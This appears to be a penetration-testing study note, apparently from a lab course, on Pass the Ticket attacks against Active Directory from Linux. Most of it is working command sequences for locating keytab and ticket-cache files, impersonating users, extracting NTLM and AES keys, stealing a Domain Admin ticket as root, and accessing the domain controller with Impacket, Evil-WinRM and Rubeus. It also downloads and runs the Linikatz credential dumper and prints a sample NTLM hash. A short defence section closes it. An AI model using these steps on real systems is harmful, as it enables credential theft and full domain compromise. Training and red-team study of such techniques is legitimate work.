# Pass the Ticket (PtT) from Linux

## 1. Concept Overview

**Pass the Ticket (PtT) on Linux** abuses **Kerberos tickets (TGT/TGS)** stored on Linux systems to impersonate users or machines in an Active Directory environment.

Key points:

* Linux systems can use Kerberos **with or without being domain-joined**
* Tickets can be reused **without passwords**
* Root or elevated privileges greatly increase impact

---

## 2. Kerberos on Linux (Key Concepts)

Linux Kerberos artifacts:

* **ccache files** → Active Kerberos tickets
* **keytab files** → Stored Kerberos keys (password equivalent)
* **KRB5CCNAME** → Environment variable pointing to active ticket cache

Default locations:

* ccache: `/tmp/krb5cc_*`
* keytab: `/etc/krb5.keytab` (machine account)

---

## 3. Identify AD Integration on Linux

### 3.1 Check Domain Membership (realm)

```bash
realm list
```

Notes:

* `configured: kerberos-member` → domain joined
* Shows permitted users and groups
* Uses `sssd` or `winbind` under the hood

---

### 3.2 Check AD Services

```bash
ps -ef | grep -i "sssd\|winbind"
```

Notes:

* Confirms AD/Kerberos integration
* Presence of `sssd_*` processes = domain joined

---

## 4. Finding Kerberos Artifacts

### 4.1 Find Keytab Files

```bash
find / -name "*keytab*" -ls 2>/dev/null
```

Notes:

* Keytabs may belong to users, services, or machine accounts
* Read access is required to abuse them
* Common locations: `/etc/`, `/opt/`, user home directories

---

### 4.2 Identify Keytabs in Cronjobs

```bash
crontab -l
```

```bash
cat /path/to/script.sh
```

Notes:

* Look for `kinit -k -t <file>`
* Scripts often reveal hidden keytabs
* Common for service accounts

---

## 5. Finding Kerberos ccache Files

### 5.1 Identify Active Ticket Cache

```bash
env | grep -i krb5
```

Notes:

* `KRB5CCNAME` points to active ticket
* Usually stored under `/tmp`

---

### 5.2 List All ccache Files

```bash
ls -la /tmp | grep krb5cc
```

Notes:

* Each logged-in user has their own cache
* Root can read all caches
* Tickets expire → check validity

---

## 6. Using Keytab Files (Impersonation)

### 6.1 Inspect Keytab Contents

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

Notes:

* Shows principal and realm
* Case-sensitive (IMPORTANT)
* Domain is uppercase

---

### 6.2 Impersonate User with Keytab

```bash
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

```bash
klist
```

Notes:

* Replaces current Kerberos identity
* Ticket stored in ccache
* No password required

---

### 6.3 Validate Access (SMB)

```bash
smbclient //dc01/carlos -k -c ls
```

Notes:

* `-k` = Kerberos auth
* Confirms successful impersonation

---

## 7. Extracting Hashes from Keytabs

### 7.1 Extract Hashes (KeyTabExtract)

```bash
python3 keytabextract.py /opt/specialfiles/carlos.keytab
```

Notes:

* Extracts:

  * NTLM hash
  * AES128 / AES256 Kerberos keys
* NTLM hash can be cracked or used for PtH
* AES keys can forge Kerberos tickets

---

### 7.2 Crack NTLM Hash (Example)

```text
NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
```

Notes:

* Use Hashcat / John / Crackstation
* Plaintext allows full login

---

## 8. Privilege Escalation via Kerberos Abuse

### 8.1 Login as Cracked User

```bash
su - carlos@inlanefreight.htb
```

```bash
klist
```

Notes:

* New Kerberos session created
* May reveal new tickets

---

### 8.2 Check Sudo Permissions

```bash
sudo -l
```

```bash
sudo su
```

Notes:

* Service accounts often have full sudo
* Leads to root access

---

## 9. Abusing ccache Files as Root

### 9.1 Identify All Tickets

```bash
ls -la /tmp | grep krb5cc
```

```bash
id julio@inlanefreight.htb
```

Notes:

* Identify high-value users (Domain Admins)
* Tickets valid until expiration

---

### 9.2 Import ccache into Session

```bash
cp /tmp/krb5cc_647401106_I8I133 /root/
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

```bash
klist
```

Notes:

* Instantly impersonates user
* No password or hash required

---

### 9.3 Access Domain Controller

```bash
smbclient //dc01/C$ -k -no-pass -c ls
```

Notes:

* Domain Admin ticket = full DC access
* Lateral movement complete

---

## 10. Using Kerberos with Attack Tools

### 10.1 Impacket with Kerberos

```bash
proxychains impacket-wmiexec dc01 -k -no-pass
```

Notes:

* Requires valid Kerberos ticket
* Must use hostname (not IP)
* Works with ccache

---

### 10.2 Evil-WinRM with Kerberos

```bash
evil-winrm -i dc01 -r inlanefreight.htb
```

Notes:

* Uses Kerberos authentication
* Requires `krb5-user` installed
* Works with ccache via KRB5CCNAME

---

## 11. Ticket Conversion (Linux ↔ Windows)

### 11.1 Convert ccache → kirbi

```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

---

### 11.2 Import Ticket on Windows

```cmd
Rubeus.exe ptt /ticket:julio.kirbi
```

Notes:

* Allows Linux-acquired tickets to be used on Windows
* Useful for cross-platform lateral movement

---

## 12. Linikatz (Linux Credential Dumper)

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
./linikatz.sh
```

Notes:

* Requires root
* Extracts:

  * ccache files
  * keytabs
  * machine tickets
* Linux equivalent of Mimikatz

---

## 13. Key Takeaways

* Linux Kerberos abuse is **extremely powerful**
* Keytabs = password equivalents
* ccache files = live sessions
* Root access = full domain compromise
* Kerberos works **across OS boundaries**

---

## 14. Detection & Defense (Blue Team)

* Monitor unusual Kerberos ticket usage
* Protect `/tmp` and keytab permissions
* Rotate service account passwords
* Disable unused Kerberos integrations
* Audit SSSD and cronjobs
